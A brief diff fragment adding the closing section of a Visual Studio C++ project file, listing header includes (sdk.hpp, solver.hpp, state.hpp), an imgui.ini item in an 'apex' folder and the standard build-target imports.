+    <ClInclude Include="sdk.hpp" />
+    <ClInclude Include="solver.hpp" />
+    <ClInclude Include="state.hpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="apex\imgui.ini" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
